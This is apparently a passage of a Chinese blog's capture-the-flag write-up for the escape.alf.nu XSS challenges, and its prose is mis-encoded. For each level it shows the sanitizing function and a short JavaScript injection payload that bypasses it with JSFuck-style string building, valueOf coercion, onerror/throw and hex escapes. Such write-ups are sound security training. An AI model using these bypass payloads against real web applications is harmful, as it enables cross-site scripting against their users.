language-js","children":["_=",["$","span",null,{"className":"hljs-string","children":"''"}],"+!",["$","span",null,{"className":"hljs-number","children":"1"}],"+!",["$","span",null,{"className":"hljs-number","children":"0"}],"+{}[",["$","span",null,{"className":"hljs-number","children":"0"}],"]+{}  ",["$","span",null,{"className":"hljs-comment","children":"//_=\"falsetrueundefined[object Object]\""}],"\n"]}]}],"\n",["$","p",null,{"children":"æ‰€ä»¥payloadå¯ä»¥ç¼©çŸ­æˆ144ä¸ªå­—ç¬¦ï¼š"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["$","span",null,{"className":"hljs-string","children":"\");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//\n"}]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"rfc4627","children":"RFC4627"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"text"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i = ",["$","span",null,{"className":"hljs-number","children":"0"}],";\n  ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"the_easy_but_expensive_way_out"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params"}],") { ",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(i++) };\n\n",["$","span",null,{"className":"hljs-comment","children":"// \"A JSON text can be safely passed into JavaScript's eval() function"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// (which compiles and executes a string) if all the characters not"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// enclosed in strings are in the set of characters that form JSON"}],"\n",["$","span",null,{"className":"hljs-comment","children":"// tokens.\""}],"\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!(",["$","span",null,{"className":"hljs-regexp","children":"/[^,:{}\\[\\]0-9.\\-+Eaeflnr-u \\n\\r\\t]/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(\n          text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"(\\\\.|[^\"\\\\])*\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],")))) {\n    ",["$","span",null,{"className":"hljs-keyword","children":"try"}]," {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," val = ",["$","span",null,{"className":"hljs-built_in","children":"eval"}],"(",["$","span",null,{"className":"hljs-string","children":"'('"}]," + text + ",["$","span",null,{"className":"hljs-string","children":"')'"}],");\n      ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"''"}]," + val);\n    } ",["$","span",null,{"className":"hljs-keyword","children":"catch"}]," (_) {\n      ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"'Crashed: '"}],"+_);\n    }\n  } ",["$","span",null,{"className":"hljs-keyword","children":"else"}]," {\n    ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"'Rejected.'"}],");\n  }\n}\n"]}]}],"\n",["$","p",null,{"children":["æ®è¯´è¿™é¢˜æ˜¯åŸºäºçœŸå®çš„æ¡ˆä¾‹ï¼Œ",["$","a",null,{"href":"https://twitter.com/WisecWisec","children":"Stefano Di Paola"}],"è®°è½½åœ¨è¿™ç¯‡",["$","a",null,{"href":"http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html","children":"æ–‡ç« "}],"ä¸­ã€‚\nä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæ˜¯å…è®¸æˆ‘ä»¬è¾“å…¥",["$","code",null,{"children":"self"}],"çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨å…¨å±€å‡½æ•°",["$","code",null,{"children":"the_easy_but_expensive_way_out"}],"äº†ã€‚\nè¿™é¢˜çš„æŠ€å·§å°±æ˜¯è®©ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå€¼æˆ–è€…ä¸€ä¸ªå­—ç¬¦ç›¸åŠ ã€‚è¿™æ ·JSå¼•æ“å°±ä¼šå»è®¡ç®—æˆ‘ä»¬çš„å¯¹è±¡çš„å€¼ï¼Œæ€ä¹ˆè®¡ç®—å‘¢ï¼Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„",["$","code",null,{"children":"valueOf"}],"æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å°†valueOfæ–¹æ³•å®šä¹‰ä¸ºé¢˜ç›®ä¸­çš„",["$","code",null,{"children":"the_easy_but_expenssive_way_out"}],"ï¼Œï¼Œå°±å¯ä»¥è§¦å‘alertå‡½æ•°äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯alert(i++)ï¼Œiä»0å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨ä¸¤æ¬¡ã€‚\nsolution(103): ",["$","code",null,{"children":"{\"valueOf\":self[\"the_easy_but_expensive_way_out\"]}+0,{\"valueOf\":self[\"the_easy_but_expensive_way_out\"]}"}],"\néœ€è¦æé†’çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”±",["$","code",null,{"children":"eval"}],"è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”±",["$","code",null,{"children":"console.log"}],"è°ƒç”¨ã€‚"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"brunn","children":"Brunn"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-attr","children":"http"}],":",["$","span",null,{"className":"hljs-comment","children":"//www.avlidienbrunn.se/xsschallenge/"}],"\n\n  s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[\\r\\n\\u2028\\u2029\\\\;,()\\[\\]<]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script> var email = '\""}]," + s + ",["$","span",null,{"className":"hljs-string","children":"\"'; <\\/script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["åˆ†å·å°–æ‹¬å·éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æ™®é€šçš„åŠæ³•æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ä¸Šä¸€é¢˜çš„æ–¹æ³•è¿˜æ˜¯æœ‰ç”¨ã€‚\næ‰€ä»¥åº”è¯¥æ„é€ çš„payloadæ˜¯ï¼š\n",["$","code",null,{"children":"'+{valueOf:Function('alert(1)')}//"}],"\næˆ–è€…",["$","code",null,{"children":"'+{valueOf:function(){alert(1)}}//"}],"\næˆ–è€…",["$","code",null,{"children":"'+{valueOf:()=>{alert(1)}}//"}],"\næˆ–è€…",["$","code",null,{"children":"'+{valueOf:a=>{alert(1)}}//"}],"\nä½†æ˜¯æœ‰æ–°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸èƒ½ä½¿ç”¨å°æ‹¬å·å’Œä¸­æ‹¬å·ã€‚\nå¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨",["$","a",null,{"href":"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals","children":"Tag Function"}],"æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\nsolution(85):"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-string","children":"'+{valueOf:Function`a${'"}],"alert",["$","span",null,{"className":"hljs-string","children":"'+String.fromCharCode`40`+1+String.fromCharCode`41`}`}//\n"}]]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"no","children":"No"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[()`<]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],"); ",["$","span",null,{"className":"hljs-comment","children":"// no function calls"}],"\n\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'var string = \"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\";\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'console.log(string);\\n'"}]," +\n           ",["$","span",null,{"className":"hljs-string","children":"'</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["å‚è€ƒèµ„æ–™ï¼š",["$","a",null,{"href":"http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/","children":"XSS technique without parentheses"}],"\nsolution(39): ",["$","code",null,{"children":"\";onerror=eval;throw'=alert\\x281\\x29'//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels in honor of K'Z'K the Destroyer"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™ä¸ªé¢˜è¦ç”¨çš„åŠæ³•è¿˜æ˜¯å’Œé¢˜ç›®ä¸€æ ·Skandia ][]ï¼Œä½†æ˜¯ä¸ç”¨å…¨éƒ¨éƒ½ç”¨å…«è¿›åˆ¶æ¥æ›¿æ¢ï¼Œåªè¦æ›¿æ¢æ‰å…ƒéŸ³å­—æ¯å°±å¯ä»¥äº†ã€‚\nsolution(60):  ",["$","code",null,{"children":"\",[][\"p\\x6fp\"][\"c\\x6fnstr\\x75ct\\x6fr\"]('\\x61l\\x65rt(1)')(),\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk-1","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels and escape sequences in honor of K'Z'K"}],"\n    ",["$","span",null,{"className":"hljs-comment","children":"// y is only sometimes a vowel, so it's only removed as a literal"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]|\\\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],")\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove certain characters that can be used to get vowels"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[{}!=<>]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜æœ‰ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œå°†æˆ‘ä»¬çš„å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶éƒ½ç»™æ›¿æ¢æˆç©ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šä¸€é¢˜çš„åšæ³•å’Œé¢˜ç›®JSON ][çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚\nsolution(85): ",["$","code",null,{"children":"\");[][\"p\\x\\x6f6fp\"][\"c\\x\\x6f6fnstr\\x\\x7575ct\\x\\x6f6fr\"]('\\x\\x6161l\\x\\x6565rt(1)')()//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"kzk-2","children":"K'Z'K"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Stephen Leppik"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove vowels in honor of K'Z'K the Destroyer"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[aeiouy]/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-comment","children":"// remove certain characters that can be used to get vowels"}],"\n    s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[{}!=<>\\\\]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"è¿™é¢˜å¤æ‚ä¸€ç‚¹ï¼Œæ²¡æƒ³åˆ°å¥½åŠæ³•ã€‚æ‰€ä»¥è¿˜æ˜¯ç”¨è€åŠæ³•ã€‚\nsolution(190):"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["$","span",null,{"className":"hljs-string","children":"\");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//\n"}]}]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-1","children":"Fruit 1"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-string","children":"'SCRIPT'"}]," === n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],") n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™ä¸ªé¢˜ç›®çš„æ¼æ´æ¥æºäºä»£ç çš„é€»è¾‘ä¸ä¸¥è°¨ã€‚\nå…³é”®åœ¨äºç¬¬6è¡Œä¸­çš„",["$","code",null,{"children":"i<n.attributes.length"}],"ï¼Œä½†æ˜¯è¿™ä¸ªlengthæ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œå¯¼è‡´å¦‚æœæœ‰å¤šä¸ªå±æ€§çš„æ—¶å€™ï¼Œå°±è¿˜å‰©ä¸‹ä¸€ä¸ªå±æ€§æ˜¯åˆ ä¸æ‰äº†ã€‚\nè¿™æ ·çš„è¯æˆ‘ä»¬å°±æ„é€ å¤šä¸ªå±æ€§å¥½äº†ï¼Œå°†",["$","code",null,{"children":"onload=alert(1)"}],"æ”¾åé¢ã€‚\nsolution(26): ",["$","code",null,{"children":"<iframe t onload=alert(1)>"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-2","children":"Fruit 2"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/script/i"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],")) n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"è¿™ä¸€é¢˜æ”¹å˜äº†ç¬¬äº”è¡Œçš„ifè¯­å¥ï¼Œçœ‹ä¸å‡ºæ¥ä¼šå¸¦æ¥ä»€ä¹ˆä¸åŒçš„å½±å“ã€‚\nè‡³å°‘å¯¹äºæˆ‘ä¸Šä¸€é¢˜çš„è§£æ³•æ²¡å½±å“ï¼Œæ‰€ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥ã€‚"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-3","children":"Fruit 3"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/script/i"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],")) n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); i--; }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"ä¸ä¼šã€‚"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"quine","children":"Quine"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Somebody"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// We've got a quine level in all of the other"}],"\n    ",["$","span",null,{"className":"hljs-comment","children":"// games, so why not have one here?"}],"\n    ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," win = alert;\n    ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"alert"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"t"}],") {\n        ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (t === s)\n            ",["$","span",null,{"className":"hljs-title function_","children":"win"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],");\n        ",["$","span",null,{"className":"hljs-keyword","children":"else"}],"\n            ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"Alert: \""}]," + t + ",["$","span",null,{"className":"hljs-string","children":"\"\\n(That's not a quine)\""}],");\n    }\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s;\n}\n"]}]}],"\n",["$","p",null,{"children":"è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚å¯æƒœæˆ‘ä¸ä¼šå•Šã€‚"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","p",null,{"children":["å‚è€ƒ",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/","children":"åšå®¢-ä¸Š"}]]}],"\n",["$","p",null,{"children":["å‚è€ƒ",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/","children":"åšå®¢-ä¸‹"}]]}]]}]]}]]
